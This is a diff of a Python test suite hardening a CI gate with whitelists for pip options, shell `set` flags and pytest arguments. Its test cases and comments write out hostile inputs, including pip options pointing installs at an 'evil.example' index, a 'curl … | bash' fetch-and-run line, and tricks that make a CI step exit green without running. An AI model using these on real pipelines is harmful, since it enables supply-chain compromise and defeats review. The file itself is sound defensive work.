@@ -33,18 +33,28 @@ FAILED = []
 SHELL_TEST_CMDS = ("[", "[[", "test")
 # Read by the tail whitelist, which is defined above their old homes. Module scope for
 # the same reason as the vocabulary above: one definition, not one per reader.
-PIP_VALUE_OPTS = ("--upgrade-strategy", "--timeout", "--retries", "--progress-bar",
-                  "--cache-dir", "--log")
-# Refused by *name*, whichever spelling: these turn a pinned install into an arbitrary one, and
-# `--index-url=URL` is a single word beginning with `-`, so a rule that only asked "does every
-# trailing token look like an option" admitted every one of them. `--only-binary`/`--no-binary`
-# and `--python-version` moved here from the value list too: their value selects what gets
-# installed, and nothing in this workflow needs them.
-PIP_PAYLOAD_OPTS = ("-r", "--requirement", "-e", "--editable", "-c", "--constraint",
-                    "-i", "--index-url", "--extra-index-url", "--find-links", "-f",
-                    "--target", "-t", "--prefix", "--root", "--config-settings", "-C",
-                    "--only-binary", "--no-binary", "--python-version", "--platform",
-                    "--implementation", "--abi", "--pre", "--no-deps")
+# The complete set of options that may follow a pinned pip install, and their arity. A *whitelist*,
+# after two rounds of trying to enumerate the dangerous ones instead:
+#
+#   round 16 refused a deny-list of payload options by name, split on `=`, which closed
+#   `--index-url=URL` and left `-ihttps://evil/simple`, `-rNOPE.txt` and `-fhttps://evil` — the
+#   glommed short forms pip parses identically — along with `--no-index`, `--proxy=`,
+#   `--trusted-host=`, `--user`, `--force-reinstall`, `--dry-run` and `--no-build-isolation`, none of
+#   which anyone had thought to name.
+#
+# Enumerating what may not happen requires knowing every option pip has, now and in later versions.
+# Enumerating what may happen requires knowing what this workflow does, which is one install of one
+# pinned requirement list. `False` means the option takes no value, `True` means it takes one word.
+PIP_OPTS = {"--quiet": False, "-q": False, "--verbose": False, "-v": False,
+            "--no-color": False, "--no-input": False, "--disable-pip-version-check": False,
+            "--upgrade": False, "-U": False, "--no-cache-dir": False,
+            "--upgrade-strategy": True, "--timeout": True, "--retries": True,
+            "--progress-bar": True}
+# The `set` flags a step may open with. `e` and `u` are required by `set_flags_ok`; the rest are what
+# a maintainer plausibly adds and none of them changes whether a command runs or whether its failure
+# is fatal. A whitelist because the blacklist version — refusing only `n` — admitted `set -teuo
+# pipefail`, and `-t` makes bash run one command and exit.
+SET_FLAGS = frozenset("euxEv")
 TERMINATOR = ("exit", "return")
 KEYWORDS = ("then", "else", "elif", "do", "done", "fi", "esac", "!", "{", "}", "(", ")")
 SHELL_NO_OPS = (":", "true", "false")
@@ -221,11 +231,60 @@ missing = [s for s in pr_gate.EXCLUDED_SUITES if not os.path.exists(os.path.join
 check("every excluded suite exists on disk", missing == [], missing)
 check("every exclusion states a reason",
       all(r.strip() for r in pr_gate.EXCLUDED_SUITES.values()))
+# An exclusion is a decision not to gate a suite, and its reason is prose nothing can check. So the
+# *set* is pinned here instead: moving a suite out of the gate now edits this line too, which is the
+# only mechanism that puts the decision in front of a reviewer. Laundering one from STDLIB_SUITES
+# into EXCLUDED_SUITES with a plausible-sounding reason was otherwise a green, silent edit.
+check("the set of suites held outside the gate is the reviewed one",
+      set(pr_gate.EXCLUDED_SUITES) == {"tests/test-cleanup.sh", "tests/test-prepare-rlm-org.sh"},
+      "edit EXCLUDED_SUITES here and in pr_gate.py together: "
+      f"{sorted(pr_gate.EXCLUDED_SUITES)}")
 check("no suite is both claimed and excluded",
       not (set(pr_gate.EXCLUDED_SUITES) & pr_gate.CLAIMED_SUITES))
 check("a suite is never run twice — no dedicated check's suite is also in a bulk list",
       "tests/test_branch_scope.py" not in pr_gate.STDLIB_SUITES
       and "tests/test_erd_doc_counts.py" not in pr_gate.STDLIB_SUITES)
+
+# Whatever a check's argv is, it has to be an argv that *runs* the suites it names. `--collect-only`
+# is the sharpest example: pytest walks the files, reports what it found and exits 0 without running
+# a test, so the check stays listed, stays selected, stays green, and asserts nothing. Confirmed
+# against a deliberately failing test — `-q` exits 1, `-q --collect-only` exits 0. Enumerating the
+# options that suppress execution means knowing pytest's whole surface (`--co`, `-k`, `--ignore=`,
+# `--deselect`, `--maxfail=0`, `-x` with a skip…), so the allowed argv words are enumerated instead:
+# an interpreter, `-m pytest`, `-q`, and paths. Anything else is a deliberate edit here.
+# `check` and `--check` are the read-only subcommands of two gate scripts (analyze_agent_tooling.py,
+# skill_manifest.py), not pytest options.
+CMD_WORDS = {"python", "python3", "-m", "pytest", "-q", "-c", "pass", "check", "--check"}
+bad_words = sorted({w for c in pr_gate.CHECKS for w in (c["cmd"] or ())
+                    if w not in CMD_WORDS and not w.startswith(("tests/", "scripts/"))})
+check("no check's argv carries a word outside CMD_WORDS — nothing that could collect without "
+      "running, or install, or redirect", bad_words == [], bad_words)
+
+# A check must run when the suite it runs is edited. The trigger-coverage rule further down asks
+# whether a check's triggers cover the files its suites *read*; this asks the more basic question it
+# skipped, about the suite file itself. Deleting `"tests/"` from a bulk check's triggers passed both
+# — the suites read scripts/ and docs/, so coverage was satisfied, and editing thirteen suites then
+# selected nothing that ran them.
+def suites_of(check_spec):
+    """The suite paths a check runs, including the two lists resolve() splices in."""
+    if check_spec["name"] == "stdlib_offline_suites":
+        return list(pr_gate.STDLIB_SUITES)
+    if check_spec["name"] == "requests_offline_suites":
+        return list(pr_gate.REQUESTS_SUITES)
+    return [a for a in (check_spec["cmd"] or ()) if a.startswith("tests/")]
+
+
+def selects(trigger, suite):
+    # pytest takes a directory without its separator (`tests/build_harness`) while triggers carry one
+    # (`tests/build_harness/`), and comparing the two spellings raw accused a correctly configured
+    # check — a rule firing on correct code, which is how rules get deleted.
+    return suite.startswith(trigger) or trigger.rstrip("/") == suite.rstrip("/")
+
+
+unselected = sorted({f"{c['name']} does not run on {s}"
+                     for c in pr_gate.CHECKS for s in suites_of(c)
+                     if not any(selects(t, s) for t in c["triggers"])})
+check("editing a suite selects the check that runs it", unselected == [], unselected)
 # Discovery must recurse. A flat listing missed 30 suites in tests/build_harness/ and
 # tests/txn_data_harness/ while reporting "none unclaimed".
 nested = [s for s in pr_gate.CLAIMED_SUITES if s.endswith("/")]
@@ -702,8 +761,7 @@ if os.path.exists(workflow):
         # literal last-command rule used to reject those by accident; once that rule became a
         # property ("one command executes the gate"), the keywords had to be named here.
         return bool(words and script in seg
-                    and words[0] not in ("echo", "printf", ":", "true",
-                                         "if", "elif", "while", "until", "!")
+                    and words[0] not in ("echo", "printf", ":", "true", "!") + SHELL_OPENERS
                     and all(a in seg for a in args_required)
                     and tail_preserves_status(tail))
 
@@ -823,6 +881,14 @@ if os.path.exists(workflow):
     # is wired ahead of anyone enabling a queue rather than discovered by it.
     check("the workflow also triggers on merge_group, so a merge queue cannot deadlock on it",
           "merge_group" in on, list(on))
+    # Present is not the same as effective. `merge_group:\n  branches: [does-not-exist]` satisfies the
+    # rule above and matches nothing, so the workflow never runs in the queue — which by the comment
+    # in the workflow itself is a merge that cannot succeed, arrived at from a green suite. The
+    # pull_request trigger gets the same treatment a few lines up, where `types` is the one filter
+    # admitted and argued for.
+    mg_filters = sorted(on.get("merge_group") or {})
+    check("the merge_group trigger carries no filter, so it matches every queued group",
+          not mg_filters, f"on.merge_group must have no keys, has {mg_filters}")
     # And nothing else, which is a whitelist for the same reason every other rule here is one. A
     # required check is satisfied by the *latest* check run of its name on the head SHA, so any
     # trigger that runs this workflow on a PR's head SHA publishes that PR's verdict. `merge_group`
@@ -1154,12 +1220,34 @@ if os.path.exists(workflow):
         same vocabulary answered differently in a fourth place. Defined here rather than beside
         `control_flow`, its second caller: the fork-branch pin is its first, ~600 lines earlier.
         """
-        line = re.sub(r"\[\[", "[", re.sub(r"\]\]", "]", line.strip()))
+        # Both substitutions are anchored on the whitespace that makes the token *syntax* rather than
+        # text. `[[` is the test builtin only when a word follows it, so `[[:digit:]]` — a POSIX
+        # character class inside a `=~` pattern — kept both brackets instead of being rewritten to the
+        # invalid `[:digit:]`, and a correct condition stopped matching its pin.
+        line = re.sub(r"\[\[(?=\s)", "[", re.sub(r"(?<=\s)\]\]", "]", line.strip()))
         # `true` only, never `false`. Written `(?:true|false)` this mapped `while false; do` onto the
         # pinned `while :; do` — canonicalising a condition to its own opposite, so the retry loop
         # could be falsified and read as reviewed. A probe aimed at this loosening caught it before it
         # shipped; the whole reason loosenings get probes.
-        return re.sub(r"\btrue\b(?=\s*;)", ":", line)
+        #
+        # And only in command position. Matched anywhere before a `;`, this turned `if grep -q true;`
+        # into `if grep -q :;` — rewriting an *argument* to a command, which is a different command.
+        keywords = "|".join(SHELL_OPENERS + ("do", "then", "else"))
+        return re.sub(rf"(^|[;|&(]|\b(?:{keywords})\b)(\s*)true\b(?=\s*;)", r"\1\2:", line)
+
+    # Canonicalisation has to normalise the two spellings and rewrite nothing else. Both failures
+    # below shipped: `[[:digit:]]` lost a bracket to the `[[`→`[` rule, and `grep -q true` had its
+    # *argument* rewritten, so two correct conditions stopped matching their pins.
+    for given, want in (("while true; do", "while :; do"),
+                        ("while :; do", "while :; do"),
+                        ('if [[ "${CROSS}" = "true" ]]; then', 'if [ "${CROSS}" = "true" ]; then'),
+                        ('if [[ "$x" =~ [[:digit:]]+ ]]; then', 'if [ "$x" =~ [[:digit:]]+ ]; then'),
+                        ("if grep -q true; then", "if grep -q true; then"),
+                        # Never the opposite: canonicalising `false` onto `:` let the retry loop be
+                        # falsified and still match its pin.
+                        ("while false; do", "while false; do")):
+        check(f"canonical_shell reads {given!r} as {want!r}",
+              canonical_shell(given) == want, canonical_shell(given))
 
     def strip_redir(text):
         return re.sub(r"\s*\d*>>?\s*&?\s*\S+", "", text).strip()
@@ -1207,17 +1295,26 @@ if os.path.exists(workflow):
         on the first error, which is the worst thing a message can do. Flags are read as a set, so
         additional letters are fine and dropping `e` or `u` is not.
 
-        Except `n`. `set -n` makes bash *read* commands without executing them, so `set -neuo
-        pipefail` keeps both required flags, satisfies every other rule, runs nothing and exits 0 —
-        a live false green the first cut of this helper admitted. A probe aimed at the loosening
-        found it; anything that decides whether commands run at all is not a "spelling".
+        "Additional letters are fine" was wrong, and refusing `n` for it was the wrong repair —
+        a blacklist of one letter, in a file whose every other rule is a whitelist. `set -teuo
+        pipefail` then kept both required flags and passed, and `-t` makes bash execute **one**
+        command and exit: the `set` itself is that command, so the step exits 0 having never run the
+        gate. Verified — `printf 'set -teuo pipefail\\necho X\\n' | bash` prints nothing, status 0.
+        `-N` is the same shape from the other side: not a real bash option, so bash refuses the whole
+        builtin and applies *nothing*, leaving errexit, nounset and pipefail all off.
+
+        So the letters are whitelisted. `e` and `u` are required; `x`, `E` and `v` are the ones a
+        maintainer plausibly adds (tracing, errtrace, verbose) and none of them changes whether a
+        command runs or whether its failure is fatal. Any other letter — real, invalid, or
+        inert-looking — has to be added here deliberately, which is a two-word edit and a decision
+        someone made on purpose.
         """
         m = re.fullmatch(r"set -([A-Za-z]+)o pipefail|set -([A-Za-z]+) -o pipefail",
                          line.strip())
         if not m:
             return False
         flags = set(m.group(1) or m.group(2))
-        return {"e", "u"} <= flags and not (flags & {"n", "N"})
+        return {"e", "u"} <= flags <= SET_FLAGS
 
     def set_line_ok(words):
         """Is this a `set` line from the allowed list, or one of them with extra flags?
@@ -1455,6 +1552,15 @@ if os.path.exists(workflow):
                      # `-n` reads the script without executing it, which would defang the whole step.
                      ("set -euno pipefail", False),
                      ("set -eu", False),
+                     # `-t` makes bash execute one command and exit, and the `set` is that command:
+                     # the step exits 0 having run nothing. Admitted for two rounds, because the rule
+                     # asked only that `e` and `u` be present and refused `n` by name — a blacklist
+                     # needing every dangerous letter named in advance. The letters are whitelisted
+                     # now, so this and `-N` (invalid, so bash applies none of the flags) both go.
+                     ("set -teuo pipefail", False),
+                     ("set -eNuo pipefail", False),
+                     ("set -eufo pipefail", False),
+                     ("set -evuo pipefail", True),
                      ("set -eo pipefail", False)):
         check(f"the set-line rule reads {line!r} as {'keeping' if ok else 'losing'} -e/-u/pipefail",
               set_flags_ok(line) is ok, line)
@@ -1592,9 +1698,14 @@ if os.path.exists(workflow):
     check("exactly one step runs branch scope", len(found_scope) == 1, len(found_scope))
     if len(found_scope) == 1:
         scope_step = found_scope[0]
-        SCOPE_KEYS = {"name", "if", "env", "run"}
-        check("branch scope carries only keys its shape needs",
-              not sorted(set(scope_step) - SCOPE_KEYS), sorted(set(scope_step) - SCOPE_KEYS))
+        # ALSO_FINE for the same reason the per-step key rule subtracts it: `timeout-minutes`, `shell`
+        # and `id` cannot express the threat these key rules are about. Omitted here, this rule and
+        # that one disagreed about the same three words, so adding a timeout to *this* step was a
+        # rejection and adding it to the gate step was not.
+        SCOPE_KEYS = {"name", "if", "env", "run"} | ALSO_FINE
+        extra = sorted(set(scope_step) - SCOPE_KEYS)
+        check("branch scope carries only keys its shape needs (SCOPE_KEYS | ALSO_FINE)",
+              not extra, extra)
         check("branch scope runs on pull requests, the only event with a PR number",
               scope_step.get("if") == "github.event_name == 'pull_request'", scope_step.get("if"))
         # The env is pinned per key, because these four values decide which branch the step takes
@@ -2109,7 +2220,7 @@ if os.path.exists(workflow):
             word = tail[i]
             if word in ("--upgrade", "-U"):
                 upgrading = True
-            elif word in PIP_VALUE_OPTS:
+            elif PIP_OPTS.get(word.partition("=")[0]) and "=" not in word:
                 i += 1  # skip the option's value, which is not a package
             elif not word.startswith("-"):
                 packages.append(word)
@@ -2206,7 +2317,7 @@ if os.path.exists(workflow):
         words = seg.split()
         while words and words[0] == "!":
             words = words[1:]
-        while words and (words[0] in KEYWORDS or words[0] in ("if", "elif", "while", "until")):
+        while words and (words[0] in KEYWORDS or words[0] in SHELL_OPENERS):
             words = words[1:]
         if not words:
             return True
@@ -2275,15 +2386,32 @@ if os.path.exists(workflow):
     # value would not be a value but a payload, and they stay refused along with bare packages.
 
     def pip_tail_ok(tail):
-        """Are these the only things allowed after a pinned pip form — options, and their values?"""
+        """Is every word after a pinned pip form an option `PIP_OPTS` names, plus its value?
+
+        Each spelling pip accepts is normalised before the lookup, because pip treats all three as
+        the same option and a rule that reads text does not: `--opt=value`, `--opt value`, and the
+        glommed short form `-ovalue`. The last one is what defeated the previous, deny-list version —
+        `-ihttps://evil/simple` begins with `-`, contains no `=`, and is not the string `-i`.
+        """
         i = 0
         while i < len(tail):
             word = tail[i]
             if not word.startswith("-"):
-                return False
-            if word.split("=", 1)[0] in PIP_PAYLOAD_OPTS:
-                return False
-            if word in PIP_VALUE_OPTS:
+                return False  # a bare package name: the install is no longer the pinned one
+            name, sep, glued = word.partition("=")
+            if not sep and re.fullmatch(r"-[A-Za-z]", word[:2]) and len(word) > 2:
+                # `-rfile.txt` is `-r file.txt`. Only single-dash options glom.
+                name, glued, sep = word[:2], word[2:], "="
+            takes_value = PIP_OPTS.get(name)
+            if takes_value is None:
+                return False  # not an option this workflow's install is allowed to carry
+            if sep:
+                # A value was supplied attached, so the option had better want one.
+                if not takes_value:
+                    return False
+                i += 1
+                continue
+            if takes_value:
                 # Consume the value, and require there to be one: a trailing `--timeout` with no
                 # value would otherwise let the next word through as an option's argument.
                 if i + 1 >= len(tail) or tail[i + 1].startswith("-"):
@@ -2292,6 +2420,27 @@ if os.path.exists(workflow):
                 continue
             i += 1
         return True
+
+    # Every spelling pip accepts for the same option, and the whole point of the whitelist: the
+    # deny-list version closed `--index-url=URL` and left the glommed short form of the same option
+    # open, along with every option nobody had thought to name.
+    for tail, ok in (("--quiet", True), ("-q", True), ("--retries 5", True),
+                     ("--upgrade-strategy eager", True), ("--progress-bar=off", True),
+                     # The three spellings of one payload option, all rejected now.
+                     ("--index-url=https://evil.example/simple", False),
+                     ("--index-url https://evil.example/simple", False),
+                     ("-ihttps://evil.example/simple", False),
+                     ("-rEVIL.txt", False), ("--no-index", False), ("--user", False),
+                     ("--trusted-host=evil.example", False), ("--force-reinstall", False),
+                     ("--dry-run", False), ("--no-build-isolation", False),
+                     # An option that takes no value, given one, is not that option.
+                     ("--quiet=please", False),
+                     # A bare word is a package: the install is no longer the pinned one.
+                     ("evil-package", False),
+                     # A value-taking option with nothing left to consume.
+                     ("--retries", False)):
+        check(f"the pip tail rule reads {tail!r} as {'allowed' if ok else 'refused'} (PIP_OPTS)",
+              pip_tail_ok(tail.split()) is ok, tail)
 
     def redirections(step):
         # The target stops at a separator: `>/dev/null; then` redirects to /dev/null, and reading the
@@ -2497,8 +2646,10 @@ if os.path.exists(workflow):
     }
 
     def control_flow(step):
-        openers = ("if", "elif", "else", "fi", "while", "until", "for", "do", "done", "case", "esac",
-                   "{", "}")
+        # Openers plus the words that close or continue them. Assembled from the shared vocabulary
+        # rather than retyped: a sixth copy of these words, disagreeing with the other five about
+        # `for` and `case`, is how three earlier rounds produced false rejections.
+        openers = SHELL_OPENERS + ("else", "fi", "do", "done", "esac", "{", "}")
         # Integer literals are normalised to `N`: the retry budget is a tunable that lives inside a
         # condition, and pinning it by text rejected `-ge 5` — an edit the comment above this rule
         # already listed as a false rejection it had removed, in the one step where the loop lives.
@@ -3158,6 +3309,16 @@ source = pathlib.Path(pr_gate.__file__).read_text()
 status_calls = source.count('"status", "--porcelain"')
 check("both git status call sites are still present", status_calls == 2, status_calls)
 
+# The selection is only as honest as the diff it reads, and a pathspec is invisible in every result
+# the gate prints. `git diff … -- ":!tests/"` reports a clean tests/ tree, so every edit to a suite —
+# including edits to this file — selects nothing and the gate passes having chosen to look away.
+# Pinned as the whole argv, because the danger is an *added* argument and no list of the arguments
+# that must not appear can be complete.
+DIFF_ARGV = '["diff", "--no-renames", "-z", "--name-only", f"{base}...HEAD"]'
+check("the diff that drives selection takes no pathspec, so no tree can be excluded from it",
+      DIFF_ARGV in source.replace("\n", " ").replace("  ", " "),
+      f"changed_files() must call git with exactly {DIFF_ARGV}")
+
 # Every git invocation goes through git(), which dies on a non-zero exit *and* on a spawn
 # failure. Adding those guards call site by call site is what failed twice: run() gained an
 # OSError guard while this path kept only FileNotFoundError, so a git on PATH that cannot be
@@ -3277,7 +3438,7 @@ if FAILED:
 # spelled `run: curl -s http://host/x | bash` produced no [FAIL] at all, just a request to bump an
 # integer. (It now fails a whitelist too, since `raw_shell_of` reads inline scalars — but the
 # message had to stop inviting that response either way.)
-EXPECTED = 443
+EXPECTED = 476
 REACHED = PASSED + len(FAILED)
 if REACHED < EXPECTED:
     print(f"only {REACHED} of {EXPECTED} checks reached a verdict — a rule stopped running, which is "
